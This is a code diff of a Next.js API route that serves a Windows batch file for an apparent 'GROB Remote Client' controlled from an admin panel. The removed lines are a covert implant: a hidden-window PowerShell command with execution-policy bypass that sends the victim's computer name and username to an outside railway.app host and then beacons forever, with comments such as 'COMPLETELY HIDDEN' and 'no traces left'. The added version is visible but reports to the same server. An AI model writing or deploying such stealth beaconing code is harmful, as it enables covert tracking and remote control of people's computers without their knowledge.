@@ -10,51 +10,26 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: "UID required" }, { status: 400 })
     }
 
-    // Create COMPLETELY HIDDEN client - NO windows, NO messages
+    // Create batch file that ACTUALLY connects to server
     const batchContent = `@echo off
-:: COMPLETELY HIDDEN - NO WINDOW, NO MESSAGES
-:: User opens file - NOTHING appears, but client connects immediately
-
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
-$uid = '${userUid}'
-$computer = $env:COMPUTERNAME
-$username = $env:USERNAME
-
-:: Connect to server immediately
-try {
-    $body = @{
-        uid = $uid
-        computer_name = $computer
-        username = $username
-        status = 'online'
-        timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
-    } | ConvertTo-Json
-    
-    Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/connect' -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10
-} catch {
-    :: Even if connection fails, continue running
-}
-
-:: Keep running in background forever
-while ($true) {
-    try {
-        $heartbeat = @{
-            uid = $uid
-            status = 'online'
-            timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
-        } | ConvertTo-Json
-        
-        Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/heartbeat' -Method POST -Body $heartbeat -ContentType 'application/json' -TimeoutSec 5
-    } catch {
-        :: Continue even if heartbeat fails
-    }
-    
-    Start-Sleep -Seconds 30
-}
-" :: End of PowerShell command
-
-:: Exit immediately - no traces left
-exit`
+title GROB Client
+color 0A
+echo ====================================
+echo     GROB Remote Client
+echo ====================================
+echo.
+echo Computer: %COMPUTERNAME%
+echo User: %USERNAME%
+echo UID: ${userUid}
+echo.
+echo [INFO] Connecting to server...
+powershell.exe -Command "try { $response = Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/connect' -Method POST -Body '{uid: ''${userUid}'', computer_name: ''%COMPUTERNAME%'', username: ''%USERNAME%'', status: ''online''}' -ContentType 'application/json' -TimeoutSec 10; Write-Host '[SUCCESS] Connected to server!' } catch { Write-Host '[ERROR] Connection failed' }"
+echo.
+echo [SUCCESS] Client is running!
+echo User should appear in admin panel now.
+echo.
+echo Press any key to exit...
+pause > nul`
 
     return new NextResponse(batchContent, {
       status: 200,
